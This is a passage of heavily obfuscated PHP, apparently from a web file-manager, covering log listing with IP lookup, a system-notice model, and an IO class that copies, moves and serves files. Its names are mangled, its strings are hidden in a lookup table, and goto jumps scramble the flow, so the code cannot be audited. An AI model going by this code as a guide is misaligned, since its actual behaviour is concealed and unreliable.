"\45{$ƒŸ®Ù»Ş[$‰²ÖÅªö[2287]]}\45"); } $ù’ÁêØä = $this->_makeOrder()->where($ŒŒƒÁ½‚)->selectPage(); if (empty($ù’ÁêØä[$‰²ÖÅªö[369]])) { show_json(array(), !0, $ù’ÁêØä[$‰²ÖÅªö[366]]); } $ù’ÁêØä[$‰²ÖÅªö[369]] = $this->logList($ù’ÁêØä[$‰²ÖÅªö[369]]); return $ù’ÁêØä; } private function ipAddress(&$ğî·üâ®) { $¯Õ…ø =& $_SERVER[ï»»·÷á]; if (!empty($ğî·üâ®[$¯Õ…ø[2287]])) { $À—×¨Ê˜ = IpLocation::get($ğî·üâ®[$¯Õ…ø[2287]]); } else { $À—×¨Ê˜ = LNG($¯Õ…ø[2290]); } $ğî·üâ®[$¯Õ…ø[2291]] = $À—×¨Ê˜; } private function descZipDownload($Òø™Í²Ô, &$‚ê¶òù¦) { $¾Àë»š =& $_SERVER[ï»»·÷á]; if (!isset($Òø™Í²Ô[$¾Àë»š[2292]])) { return; } $Ô¨Ù¶Ôü = json_decode($Òø™Í²Ô[$¾Àë»š[2292]], !0); foreach ($Ô¨Ù¶Ôü as $°¨ĞÓÌ) { try { $Ÿ…Œ‚û“ = IO::infoFull($°¨ĞÓÌ[$¾Àë»š[84]]); } catch (Exception $¶ÀŸ­¾è) { continue; } $Òø™Í²Ô[$¾Àë»š[84]] = $°¨ĞÓÌ[$¾Àë»š[84]]; $‚ê¶òù¦[] = $Òø™Í²Ô[$¾Àë»š[411]] = $Ÿ…Œ‚û“[$¾Àë»š[411]]; $‚ê¶òù¦[] = $Òø™Í²Ô[$¾Àë»š[2094]] = $Ÿ…Œ‚û“[$¾Àë»š[441]]; break; } return $Òø™Í²Ô; } private function getSourceList(&$Õî¹ù­Œ) { $ÇÀ©µ =& $_SERVER[ï»»·÷á]; $‘Á´ø = array(); foreach ($Õî¹ù­Œ as $’¶…íÜ => $Âíø‰Ù) { $ìŸ Ê¯ï = json_decode($Âíø‰Ù[$ÇÀ©µ[462]], !0); if ($Âíø‰Ù[$ÇÀ©µ[33]] == $ÇÀ©µ[1841]) { $ìŸ Ê¯ï = $this->descZipDownload($ìŸ Ê¯ï, $‘Á´ø); $Õî¹ù­Œ[$’¶…íÜ][$ÇÀ©µ[462]] = json_encode($ìŸ Ê¯ï); continue; } if (strpos($Âíø‰Ù[$ÇÀ©µ[33]], $ÇÀ©µ[2096]) !== 0) { if (!isset($ìŸ Ê¯ï[$ÇÀ©µ[84]]) || strpos($Âíø‰Ù[$ÇÀ©µ[33]], $ÇÀ©µ[2293]) !== 0) { continue; } try { $†ß¸Ÿ—Ã = IO::infoFull($ìŸ Ê¯ï[$ÇÀ©µ[84]]); } catch (Exception $İõ€ò) { continue; } $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[411]] = $†ß¸Ÿ—Ã[$ÇÀ©µ[411]]; $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[2094]] = $†ß¸Ÿ—Ã[$ÇÀ©µ[441]]; $Õî¹ù­Œ[$’¶…íÜ][$ÇÀ©µ[462]] = json_encode($ìŸ Ê¯ï); continue; } $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[411]]; $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[2094]]; if ($ìŸ Ê¯ï[$ÇÀ©µ[33]] == $ÇÀ©µ[557]) { $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[462]][$ÇÀ©µ[1170]]; $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[462]][$ÇÀ©µ[1171]]; } if ($ìŸ Ê¯ï[$ÇÀ©µ[33]] == $ÇÀ©µ[2104]) { $‘Á´ø[] = $ìŸ Ê¯ï[$ÇÀ©µ[462]][$ÇÀ©µ[411]]; } } if (!$‘Á´ø) { return array(); } return Model($ÇÀ©µ[838])->sourceListInfo($‘Á´ø, !0); } private function logList($¿íœÆ½÷) { $Ëû“¡‹ =& $_SERVER[ï»»·÷á]; $ØÈµŸ™† = array_to_keyvalue($¿íœÆ½÷, $Ëû“¡‹[12], $Ëû“¡‹[1678]); $Ø·¨‰¯… = Model($Ëû“¡‹[534])->userListInfo(array_unique($ØÈµŸ™†)); $“ œÅñ¬ = $this->getSourceList($¿íœÆ½÷); $…ÄóÅ˜ù = $this->typeAll(); $Ş¿áú„Õ = array(); $¢„Ò· = array(); foreach ($¿íœÆ½÷ as $ğ×”È²‰ => $ÚËüÜ©) { $ßî„¬ÕÜ = $ÚËüÜ©[$Ëû“¡‹[33]]; $•Òí „ = isset($Ø·¨‰¯…[$ÚËüÜ©[$Ëû“¡‹[1678]]]) ? $Ø·¨‰¯…[$ÚËüÜ©[$Ëû“¡‹[1678]]] : !1; $ıùîÀâ„ = strpos($ßî„¬ÕÜ, $Ëû“¡‹[2294]) === 0 ? LNG($Ëû“¡‹[2295]) : LNG($Ëû“¡‹[2290]); $ÚËüÜ©[$Ëû“¡‹[32]] = isset($•Òí „[$Ëû“¡‹[32]]) ? $•Òí „[$Ëû“¡‹[32]] : LNG($Ëû“¡‹[2290]); $ÚËüÜ©[$Ëû“¡‹[541]] = isset($•Òí „[$Ëû“¡‹[541]]) ? $•Òí „[$Ëû“¡‹[541]] : $Ëû“¡‹[12]; $ÚËüÜ©[$Ëû“¡‹[1576]] = isset($…ÄóÅ˜ù[$ßî„¬ÕÜ]) ? $…ÄóÅ˜ù[$ßî„¬ÕÜ] : $ıùîÀâ„; $ÚËüÜ©[$Ëû“¡‹[2039]] = $•Òí „; $ö³òï = json_decode($ÚËüÜ©[$Ëû“¡‹[462]], !0); $ÚËüÜ©[$Ëû“¡‹[2287]] = isset($ö³òï[$Ëû“¡‹[2287]]) ? $ö³òï[$Ëû“¡‹[2287]] : $Ëû“¡‹[12]; $ÚËüÜ©[$Ëû“¡‹[2291]] = IpLocation::get($ÚËüÜ©[$Ëû“¡‹[2287]]); if (strpos($ßî„¬ÕÜ, $Ëû“¡‹[2096]) === 0 || isset($ö³òï[$Ëû“¡‹[2094]])) { $ö³òï[$Ëû“¡‹[87]] = $“ œÅñ¬[$ö³òï[$Ëû“¡‹[411]]]; $ö³òï[$Ëû“¡‹[2109]] = $“ œÅñ¬[$ö³òï[$Ëû“¡‹[2094]]]; if ($ö³òï[$Ëû“¡‹[33]] == $Ëû“¡‹[557]) { $ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[1170]] = $“ œÅñ¬[$ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[1170]]]; $ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[1171]] = $“ œÅñ¬[$ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[1171]]]; } if ($ö³òï[$Ëû“¡‹[33]] == $Ëû“¡‹[2104]) { $ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[411]] = $“ œÅñ¬[$ö³òï[$Ëû“¡‹[462]][$Ëû“¡‹[411]]]; } if ($ö³òï[$Ëû“¡‹[33]] == $Ëû“¡‹[1836]) { $ö³òï[$Ëû“¡‹[2109]] = $ö³òï[$Ëû“¡‹[87]]; $ö³òï[$Ëû“¡‹[2094]] = $ö³òï[$Ëû“¡‹[2109]][$Ëû“¡‹[411]]; $ö³òï[$Ëû“¡‹[87]] = !1; $ö³òï[$Ëû“¡‹[411]] = $Ëû“¡‹[12]; } if ($ö³òï[$Ëû“¡‹[87]] && $ö³òï[$Ëû“¡‹[87]][$Ëû“¡‹[420]] == $Ëû“¡‹[1294]) { $¢„Ò·[] = $ÚËüÜ©[$Ëû“¡‹[399]]; unset($¿íœÆ½÷[$ğ×”È²‰]); continue; } if ($ö³òï[$Ëû“¡‹[2109]] && $ö³òï[$Ëû“¡‹[2109]][$Ëû“¡‹[420]] == $Ëû“¡‹[1294]) { $¢„Ò·[] = $ÚËüÜ©[$Ëû“¡‹[399]]; unset($¿íœÆ½÷[$ğ×”È²‰]); continue; } } $ÚËüÜ©[$Ëû“¡‹[462]] = $ö³òï; unset($ÚËüÜ©[$Ëû“¡‹[2296]]); $Ş¿áú„Õ[] = $ÚËüÜ©; } $this->clearSystemPathLog($¢„Ò·); return $Ş¿áú„Õ; } private function clearSystemPathLog($í¸şúÚ) { $ŠàŒÕüœ =& $_SERVER[ï»»·÷á]; if (count($í¸şúÚ) == 0) { return; } $ç²Ÿüô = array($ŠàŒÕüœ[399] => array($ŠàŒÕüœ[7], array_unique($í¸şúÚ))); $this->where($ç²Ÿüô)->delete(); } public function deviceList($÷¼û½‰, $ÔğºôÖ = 0) { $×øëÆ¡î =& $_SERVER[ï»»·÷á]; $öà¬×Óé = array($×øëÆ¡î[1678] => $÷¼û½‰, $×øëÆ¡î[201] => array($×øëÆ¡î[1024], $ÔğºôÖ), $×øëÆ¡î[33] => $×øëÆ¡î[1810]); $§çé“î» = array(); $É’¼˜ÄÊ = $this->field($×øëÆ¡î[2297])->where($öà¬×Óé)->order($×øëÆ¡î[2107])->limit(50)->select(); foreach ($É’¼˜ÄÊ as $±©í‘“Î => $øğğ÷¯) { if ($±©í‘“Î > 0 && abs($øğğ÷¯[$×øëÆ¡î[201]] - $É’¼˜ÄÊ[$±©í‘“Î - 1][$×øëÆ¡î[201]]) < 5) { continue; } $¾´½ì²Í = json_decode($øğğ÷¯[$×øëÆ¡î[462]], !0); $øğğ÷¯[$×øëÆ¡î[2287]] = isset($¾´½ì²Í[$×øëÆ¡î[2287]]) ? $¾´½ì²Í[$×øëÆ¡î[2287]] : $×øëÆ¡î[12]; unset($¾´½ì²Í[$×øëÆ¡î[2287]]); $îË‘ÉÖ = $this->deviceType($¾´½ì²Í[$×øëÆ¡î[2097]]); if (isset($§çé“î»[$îË‘ÉÖ])) { continue; } $øğğ÷¯[$×øëÆ¡î[2291]] = IpLocation::get($øğğ÷¯[$×øëÆ¡î[2287]]); $øğğ÷¯[$×øëÆ¡î[462]] = $¾´½ì²Í; $§çé“î»[$îË‘ÉÖ] = $øğğ÷¯; } return array_values($§çé“î»); } public function deviceType($¦Ó›¼èŸ) { return $¦Ó›¼èŸ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\x6e\x6f\x74\x69\143\145\114\151\x73\x74"; public $field = array("\156\x61\155\x65", "\143\157\x6e\x74\x65\156\164", "\141\165\x74\150", "\x6d\157\144\x65", "\164\x69\x6d\x65", "\x74\x79\x70\x65", "\154\145\x76\145\x6c", "\x65\156\x61\x62\x6c\145", "\x73\x6f\x72\164"); public function listData($¹’ŸÁÙ = false, $®êúƒš = "\163\x6f\162\x74", $¶ëÒš = false) { return parent::listData($¹’ŸÁÙ, $®êúƒš, $¶ëÒš); } public function add($Äóò¦Ê) { $æà¤±ş¬ =& $_SERVER[ï»»·÷á]; $óƒšà¯ˆ = time(); if ($Äóò¦Ê[$æà¤±ş¬[16]] == $æà¤±ş¬[2298]) { $óƒšà¯ˆ = strtotime($Äóò¦Ê[$æà¤±ş¬[180]]); } $Äóò¦Ê[$æà¤±ş¬[180]] = $óƒšà¯ˆ; return parent::insert($Äóò¦Ê); } public function update($Ëê–ïı, $æíÈ±°‰) { $÷›ƒÅå› =& $_SERVER[ï»»·÷á]; $÷şíÖ‹­ = $this->listData($Ëê–ïı); if (!$÷şíÖ‹­) { return !1; } $Ü¶Ï‚©ã = time(); if ($æíÈ±°‰[$÷›ƒÅå›[16]] == $÷›ƒÅå›[2298]) { $Ü¶Ï‚©ã = strtotime($æíÈ±°‰[$÷›ƒÅå›[180]]); } $æíÈ±°‰[$÷›ƒÅå›[180]] = $Ü¶Ï‚©ã; return parent::update($Ëê–ïı, $æíÈ±°‰); } public function remove($œâƒ×“¹) { $‰ÙÜ”Å = $this->listData($œâƒ×“¹); if (!$‰ÙÜ”Å || $‰ÙÜ”Å[$_SERVER[ï»»·÷á][1294]]) { return !1; } return parent::remove($œâƒ×“¹); } public function sort($‚÷ºÂ, $Ï çşÙÒ) { return parent::update($‚÷ºÂ, $Ï çşÙÒ); } public function enable($Ú«×Íª’, $áÍÖ€š) { return parent::update($Ú«×Íª’, array($_SERVER[ï»»·÷á][2299] => $áÍÖ€š)); } private function initUserOption() { $·Ò˜Ê– =& $_SERVER[ï»»·÷á]; $this->optionType = $·Ò˜Ê–[2300]; $this->modelType = $·Ò˜Ê–[2301]; $this->field = array($·Ò˜Ê–[2302], $·Ò˜Ê–[32], $·Ò˜Ê–[180], $·Ò˜Ê–[33], $·Ò˜Ê–[2303], $·Ò˜Ê–[762], $·Ò˜Ê–[196]); } public function userNoticeGet($Ù½ğëŠ = false) { $this->initUserOption(); return parent::listData($Ù½ğëŠ, $_SERVER[ï»»·÷á][399], !0); } public function userNoticeAdd($€İÌæÜ) { $³¨¥×»› =& $_SERVER[ï»»·÷á]; $this->initUserOption(); $öŞÄùèå = $this->findByKey($³¨¥×»›[2302], $€İÌæÜ[$³¨¥×»›[399]]); if ($öŞÄùèå) { return !0; } $¸¹ÍŸ–­ = array($³¨¥×»›[2302] => $€İÌæÜ[$³¨¥×»›[399]], $³¨¥×»›[32] => $€İÌæÜ[$³¨¥×»›[32]], $³¨¥×»›[180] => $€İÌæÜ[$³¨¥×»›[180]], $³¨¥×»›[33] => isset($€İÌæÜ[$³¨¥×»›[33]]) ? $€İÌæÜ[$³¨¥×»›[33]] : 1, $³¨¥×»›[2303] => isset($€İÌæÜ[$³¨¥×»›[2303]]) ? $€İÌæÜ[$³¨¥×»›[2303]] : 0, $³¨¥×»›[762] => 0, $³¨¥×»›[196] => 0); return parent::insert($¸¹ÍŸ–­); } public function userNoticeEdit($š²¿å¸ş, $÷Ë¡ ØÅ) { $this->initUserOption(); return parent::update($š²¿å¸ş, $÷Ë¡ ØÅ); } } goto cÏÄİ¦öÚ…; E±“³§œ•³: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ĞˆÖå, $î“šê„ğ) { $òüôˆ†¼ =& $_SERVER[ï»»·÷á]; $ëîÖòó³ = $î“šê„ğ; $GLOBALS[$òüôˆ†¼[1156]] = $òüôˆ†¼[1157] . $ĞˆÖå; Hook::trigger($òüôˆ†¼[1157] . $ĞˆÖå . $òüôˆ†¼[1158], $ëîÖòó³); $“§Ç©¤— = self::driverMake($î“šê„ğ[0]); if (!$“§Ç©¤—) { return !1; } if (method_exists($“§Ç©¤—, $ĞˆÖå)) { $¤µÂ×³¯ = @call_user_func_array(array($“§Ç©¤—, $ĞˆÖå), $î“šê„ğ); } else { if (method_exists($“§Ç©¤—, $òüôˆ†¼[1159])) { $¤µÂ×³¯ = @call_user_func_array(array($“§Ç©¤—, $ĞˆÖå), $î“šê„ğ); } else { if (method_exists(self, $ĞˆÖå)) { $¤µÂ×³¯ = @call_user_func_array(array(self, $ĞˆÖå), $î“šê„ğ); } else { $¤µÂ×³¯ = call_user_func_array(array(parent, $ĞˆÖå), $î“šê„ğ); } } } Hook::trigger($òüôˆ†¼[1157] . $ĞˆÖå . $òüôˆ†¼[1160], $ëîÖòó³, $¤µÂ×³¯); return $¤µÂ×³¯; } public static function init($Œ®“®Ï’) { return self::driverMake($Œ®“®Ï’); } public static function copy($¨ëŸ‹Ö, $ˆ¿ï‚, $¼ »ÍÖ† = false, $ñû±±¾Ä = false) { return self::copyMoveStart($¨ëŸ‹Ö, $ˆ¿ï‚, $¼ »ÍÖ†, $_SERVER[ï»»·÷á][555], $ñû±±¾Ä); } public static function move($ƒâŒèŠŒ, $ŞÛ±Öê¹, $ê˜‚€­Æ = false, $ÔÁùÆ”ä = false) { return self::copyMoveStart($ƒâŒèŠŒ, $ŞÛ±Öê¹, $ê˜‚€­Æ, $_SERVER[ï»»·÷á][557], $ÔÁùÆ”ä); } private static function copyMoveStart($ë…óªÃÅ, $ÒòÉ¿¡Æ, $ø§ÛÚšè, $ü¶·®¤ó, $éñ¯áŠŒ) { $Êé–øœú =& $_SERVER[ï»»·÷á]; $î»¦»Õö = array($ë…óªÃÅ, $ÒòÉ¿¡Æ, $ø§ÛÚšè, $éñ¯áŠŒ); Hook::trigger($Êé–øœú[1157] . $ü¶·®¤ó . $Êé–øœú[1158], $î»¦»Õö); $ ìÔò×Å = self::copyMove($ë…óªÃÅ, $ÒòÉ¿¡Æ, $ø§ÛÚšè, $ü¶·®¤ó, $éñ¯áŠŒ); Hook::trigger($Êé–øœú[1157] . $ü¶·®¤ó . $Êé–øœú[1160], $î»¦»Õö, $ ìÔò×Å); return $ ìÔò×Å; } public static function saveFile($Ÿò·½èˆ, $èİ±¾‰, $¹èÄÉÒâ = true) { $Í¤ßñÕ =& $_SERVER[ï»»·÷á]; $Â˜Ç¾€ = self::info($èİ±¾‰); $ä¼…˜û¾ = self::driverMake($Ÿò·½èˆ); $€Ï¢ë’ = self::driverMake($èİ±¾‰); $µŠ…áêä = !1; if ($€Ï¢ë’->pathParse[$Í¤ßñÕ[1161]]) { $µŠ…áêä = $€Ï¢ë’; $´¼ØĞ× = $€Ï¢ë’->pathParse[$Í¤ßñÕ[1161]]; $€Ï¢ë’ = self::driverMake($´¼ØĞ×); } if ($ä¼…˜û¾->pathParse[$Í¤ßñÕ[1161]]) { $ßÃÊí£ı = $ä¼…˜û¾->pathParse[$Í¤ßñÕ[1161]]; $ä¼…˜û¾ = self::driverMake($ßÃÊí£ı); } $ü¸›û½„ = $€Ï¢ë’->pathFather($èİ±¾‰); $„şÚíò  = !0; if (!$¹èÄÉÒâ && self::driverIsSame($ä¼…˜û¾, $€Ï¢ë’)) { $„şÚíò  = !1; } $ÎÛ•“õŠ = self::copyFile($ä¼…˜û¾, $Ÿò·½èˆ, $€Ï¢ë’, $ü¸›û½„, $Â˜Ç¾€[$Í¤ßñÕ[32]], $„şÚíò ); if ($µŠ…áêä) { $ÎÛ•“õŠ = $µŠ…áêä->getPathOuter($ÎÛ•“õŠ); } return $ÎÛ•“õŠ; } private static function copyMove($çÀá¼‹â, $û”±‡ƒ, $ü¦ÇµÙ, $¿ó¡ˆ£Ö, $®ª¶œå = false) { $Ÿˆ½‘æ =& $_SERVER[ï»»·÷á]; if (!$çÀá¼‹â || $çÀá¼‹â == $Ÿˆ½‘æ[8] || !$û”±‡ƒ) { return !1; } ignore_timeout(); $¦ÑÁÁß = self::driverMake($çÀá¼‹â); $Œğ”êşí = self::driverMake($û”±‡ƒ); $…ÜÁÈ¶ = $¿ó¡ˆ£Ö == $Ÿˆ½‘æ[557]; $Öç¿ñ’ = !1; if ($Œğ”êşí->pathParse[$Ÿˆ½‘æ[1161]]) { $Öç¿ñ’ = $Œğ”êşí; $û”±‡ƒ = $Œğ”êşí->pathParse[$Ÿˆ½‘æ[1161]]; $Œğ”êşí = self::driverMake($û”±‡ƒ); } if ($¦ÑÁÁß->pathParse[$Ÿˆ½‘æ[1161]]) { $çÀá¼‹â = $¦ÑÁÁß->pathParse[$Ÿˆ½‘æ[1161]]; $¦ÑÁÁß = self::driverMake($çÀá¼‹â); } self::check($¦ÑÁÁß, $çÀá¼‹â, $Œğ”êşí, $û”±‡ƒ); Hook::trigger($Ÿˆ½‘æ[1162], $¦ÑÁÁß, $çÀá¼‹â, $Œğ”êşí, $û”±‡ƒ); $¥Ü¿¸Ö™ = self::driverIsSame($¦ÑÁÁß, $Œğ”êşí); if ($¥Ü¿¸Ö™) { if ($¿ó¡ˆ£Ö == $Ÿˆ½‘æ[557] && !method_exists($Œğ”êşí, $Ÿˆ½‘æ[1163]) && trim($û”±‡ƒ, $Ÿˆ½‘æ[8]) == trim($Œğ”êşí->pathFather($çÀá¼‹â), $Ÿˆ½‘æ[8])) { if ($¦ÑÁÁß->pathThis($çÀá¼‹â) != $®ª¶œå && !$¦ÑÁÁß->isTypeObject()) { return $¦ÑÁÁß->rename($çÀá¼‹â, $®ª¶œå); } return $Œğ”êşí->getPathOuter($çÀá¼‹â); } if (method_exists($Œğ”êşí, $¿ó¡ˆ£Ö)) { return $Œğ”êşí->{$¿ó¡ˆ£Ö}($çÀá¼‹â, $û”±‡ƒ, $ü¦ÇµÙ, $®ª¶œå); } } if ($¥Ü¿¸Ö™ && $¿ó¡ˆ£Ö == $Ÿˆ½‘æ[557] && $Œğ”êşí->getType() == $Ÿˆ½‘æ[106]) { $à°‹×õå = $Œğ”êşí->movePath($çÀá¼‹â, $û”±‡ƒ, $®ª¶œå); if ($à°‹×õå) { return $à°‹×õå; } } $åÜı¬”ñ = $¦ÑÁÁß->isFile($çÀá¼‹â); if (!$åÜı¬”ñ && $Œğ”êşí->getType() == $Ÿˆ½‘æ[770] && $¦ÑÁÁß->getType() == $Ÿˆ½‘æ[106]) { $à°‹×õå = $Œğ”êşí->copyFolderFromIO($¦ÑÁÁß, $çÀá¼‹â, $û”±‡ƒ, $ü¦ÇµÙ, $…ÜÁÈ¶, $®ª¶œå); } else { $à°‹×õå = self::copyPath($¦ÑÁÁß, $çÀá¼‹â, $Œğ”êşí, $û”±‡ƒ, $ü¦ÇµÙ, $…ÜÁÈ¶, $åÜı¬”ñ, $®ª¶œå); } if ($à°‹×õå && $…ÜÁÈ¶) { $¦ÑÁÁß->remove($çÀá¼‹â); } if ($Öç¿ñ’) { $à°‹×õå = $Öç¿ñ’->getPathOuter($à°‹×õå); } return $à°‹×õå; } private static function check($ãÀÌÖÆ, $óÊ††­, $¹ÈÃçŞ•, &$‘ã„Ø¨) { $ºÉÚïÇâ =& $_SERVER[ï»»·÷á]; if (self::driverIsSame($ãÀÌÖÆ, $¹ÈÃçŞ•) && $ãÀÌÖÆ->isFolder($óÊ††­) && $ãÀÌÖÆ->isParentOf($óÊ††­, $‘ã„Ø¨)) { show_json(LNG($ºÉÚïÇâ[1164]), !1); } if (!$ãÀÌÖÆ->exist($óÊ††­)) { show_json(LNG($ºÉÚïÇâ[105]), !1); } } private static function copyPath($‹¬à‚®, $ŠÚğ…ä¥, $îúöş÷Ç, $¨’®ã¾Ë, $Áö¨µ©î, $äùˆë«Ç, $¯“© İ, $ÊÆ„œ¾£ = false, $ø£«’©î = true) { $¥î¬§ =& $_SERVER[ï»»·÷á]; $“¥½¥³š = empty($ÊÆ„œ¾£) && $ÊÆ„œ¾£ !== $¥î¬§[198] ? $‹¬à‚®->pathThis($ŠÚğ…ä¥) : $ÊÆ„œ¾£; if ($Áö¨µ©î) { $Øö—Æ¢¼ = $îúöş÷Ç->fileNameExist($¨’®ã¾Ë, $“¥½¥³š); $Ú¤Ô†Æè = $“¥½¥³š; $“¥½¥³š = $îúöş÷Ç->fileNameAuto($¨’®ã¾Ë, $“¥½¥³š, $Áö¨µ©î, !$¯“© İ); if (!$Øö—Æ¢¼ || $Ú¤Ô†Æè != $“¥½¥³š) { $Áö¨µ©î = !1; } if ($ø£«’©î && !$Áö¨µ©î) { $îúöş÷Ç->_data[$¥î¬§[1165]] = !0; } } if ($¯“© İ) { return self::copyFile($‹¬à‚®, $ŠÚğ…ä¥, $îúöş÷Ç, $¨’®ã¾Ë, $“¥½¥³š, $äùˆë«Ç); } if ($Áö¨µ©î == REPEAT_RENAME_FOLDER) { $Áö¨µ©î = !1; } $ç¡åÕë‰ = rtrim($¨’®ã¾Ë, $¥î¬§[8]) . $¥î¬§[8] . $“¥½¥³š; $‘¼ßèÄ = $îúöş÷Ç->mkdir($îúöş÷Ç->getPath($ç¡åÕë‰), $Áö¨µ©î); $¨’®ã¾Ë = $îúöş÷Ç->getPathInner($‘¼ßèÄ); $®ã«¤ÕÇ = $‹¬à‚®->listPath($ŠÚğ…ä¥, !0); $®ã«¤ÕÇ = is_array($®ã«¤ÕÇ) ? $®ã«¤ÕÇ : array($¥î¬§[83] => array(), $¥î¬§[82] => array()); $ª‚§Éå‹ = array_merge($®ã«¤ÕÇ[$¥î¬§[83]], $®ã«¤ÕÇ[$¥î¬§[82]]); foreach ($ª‚§Éå‹ as $•À€éè) { $¬†Êç£Ä = $•À€éè[$¥î¬§[33]] == $¥î¬§[200]; $ŠÚğ…ä¥ = $‹¬à‚®->getPathInner($•À€éè[$¥î¬§[84]]); $ÒÓòÄì• = self::copyPath($‹¬à‚®, $ŠÚğ…ä¥, $îúöş÷Ç, $¨’®ã¾Ë, $Áö¨µ©î, $äùˆë«Ç, $¬†Êç£Ä, !1, !1); if (!$ÒÓòÄì•) { IO::errorTips($¥î¬§[1166] . $ŠÚğ…ä¥ . $¥î¬§[70] . $¨’®ã¾Ë); } } self::copyMoveKeepInfo($‹¬à‚®, $ŠÚğ…ä¥, $‘¼ßèÄ); return $‘¼ßèÄ; } private static function copyFile($ĞˆıâÚı, $¦©ãœ¤¤, $¢¾â¬¤, $¸Öå·Ï¹, $÷œ¹Çğ, $¸úŞÒ·ü) { $‚‘ëûª¦ =& $_SERVER[ï»»·÷á]; $¸Öå·Ï¹ = $¢¾â¬¤->getPath(rtrim($¸Öå·Ï¹, $‚‘ëûª¦[8]) . $‚‘ëûª¦[8] . $÷œ¹Çğ); $ºˆÈÑ€ = $‚‘ëûª¦[1167] . time() . rand_string(5); Hook::trigger($‚‘ëûª¦[1168], $ĞˆıâÚı, $¦©ãœ¤¤, $¢¾â¬¤, $¸Öå·Ï¹, $÷œ¹Çğ, $ºˆÈÑ€); if (self::driverIsSame($ĞˆıâÚı, $¢¾â¬¤)) { if ($¸úŞÒ·ü) { $Ÿ°ÌÌŠÒ = $¢¾â¬¤->moveFile($¦©ãœ¤¤, $¸Öå·Ï¹); } else { $Ÿ°ÌÌŠÒ = $¢¾â¬¤->copyFile($¦©ãœ¤¤, $¸Öå·Ï¹); } Hook::trigger($‚‘ëûª¦[1169], $ĞˆıâÚı, $¦©ãœ¤¤, $¢¾â¬¤, $¸Öå·Ï¹, $÷œ¹Çğ, $Ÿ°ÌÌŠÒ); self::copyMoveKeepInfo($ĞˆıâÚı, $¦©ãœ¤¤, $Ÿ°ÌÌŠÒ); return $Ÿ°ÌÌŠÒ; } $ìÑŸÀšƒ = TEMP_FILES; if ($GLOBALS[$‚‘ëûª¦[6]][$‚‘ëûª¦[89]][$‚‘ëûª¦[809]]) { $ìÑŸÀšƒ = $GLOBALS[$‚‘ëûª¦[6]][$‚‘ëûª¦[89]][$‚‘ëûª¦[809]]; } $Å¼Ñ»ã = $ìÑŸÀšƒ; mk_dir($Å¼Ñ»ã); $£¦ò³³· = $Å¼Ñ»ã . $ºˆÈÑ€; $æ”­È¦Œ = $£¦ò³³·; $£¦ò³³· = $ĞˆıâÚı->download($¦©ãœ¤¤, $£¦ò³³·); $£¦ò³³· = $ĞˆıâÚı->iconvApp($£¦ò³³·); if (substr($£¦ò³³·, strlen($ìÑŸÀšƒ)) == $ìÑŸÀšƒ) { $¸úŞÒ·ü = !0; } $Ÿ°ÌÌŠÒ = $¢¾â¬¤->upload($¸Öå·Ï¹, $£¦ò³³·, $¸úŞÒ·ü); self::remove($æ”­È¦Œ); Hook::trigger($‚‘ëûª¦[1169], $ĞˆıâÚı, $¦©ãœ¤¤, $¢¾â¬¤, $¸Öå·Ï¹, $÷œ¹Çğ, $Ÿ°ÌÌŠÒ); self::copyMoveKeepInfo($ĞˆıâÚı, $¦©ãœ¤¤, $Ÿ°ÌÌŠÒ); return $Ÿ°ÌÌŠÒ; } private static function copyMoveKeepInfo($‡ûÜùª, $Â±Š¨ ½, $Ù‰ÕŞÔ) { if (!$Ù‰ÕŞÔ) { return; } $˜µ‚æù† = $‡ûÜùª->info($Â±Š¨ ½); if (!is_array($˜µ‚æù†)) { return; } IO::setModifyTime($Ù‰ÕŞÔ, $˜µ‚æù†[$_SERVER[ï»»·÷á][85]]); } public static function pathFather($„“„È) { $’£¯å§ô = IO::init($„“„È); $Ûª¬‡åË = $’£¯å§ô->pathFather($’£¯å§ô->path); return $’£¯å§ô->getPathOuter($Ûª¬‡åË); } public static function fileOut($º¯½²¶Â, $Î•£¿µ¥ = false, $ò°›â„ = false, $ƒÜûö¢ı = '') { $ÛÔ¹ªØæ = self::driverMake($º¯½²¶Â); if ($ÛÔ¹ªØæ->isFileOutServer()) { return $ÛÔ¹ªØæ->fileOutServer($º¯½²¶Â, $Î•£¿µ¥, $ò°›â„, $ƒÜûö¢ı); } return $ÛÔ¹ªØæ->fileOut($º¯½²¶Â, $Î•£¿µ¥, $ò°›â„, $ƒÜûö¢ı); } public static function fileOutImage($ı…èı¿, $°‘…Ò®Ö = 250) { $å—ú³äÀ = array(250, 600, 1200, 2000, 3000, 5000); for ($½äş¢Ö = 0; $½äş¢Ö < count($å—ú³äÀ); $½äş¢Ö++) { if ($½äş¢Ö == 0 && $°‘…Ò®Ö <= $å—ú³äÀ[$½äş¢Ö]) { $°‘…Ò®Ö = $å—ú³äÀ[$½äş¢Ö]; break; } else { if ($°‘…Ò®Ö > $å—ú³äÀ[$½äş¢Ö - 1] && $°‘…Ò®Ö <= $å—ú³äÀ[$½äş¢Ö]) { $°‘…Ò®Ö = $å—ú³äÀ[$½äş¢Ö]; break; } else { if ($½äş¢Ö == count($å—ú³äÀ) - 1 && $°‘…Ò®Ö > $å—ú³äÀ[$½äş¢Ö]) { $°‘…Ò®Ö = $å—ú³äÀ[$½äş¢Ö]; break; } } } } $¸ÖÑİşê = self::driverMake($ı…èı¿); if ($¸ÖÑİşê->isFileOutServer()) { return $¸ÖÑİşê->fileOutImageServer($ı…èı¿, $°‘…Ò®Ö); } return $¸ÖÑİşê->fileOutImage($ı…èı¿, $°‘…Ò®Ö); } private static function driverIsSame($çûŞ°¡Æ, $½í· ùê) { $»ïé¸ø¿ =& $_SERVER[ï»»·÷á]; $“¡¨“×— = $çûŞ°¡Æ->getType(); $ÛÌ•íÙÃ = $½í· ùê->getType(); if ($“¡¨“×— != $ÛÌ•íÙÃ) { return !1; } if ($“¡¨“×— == 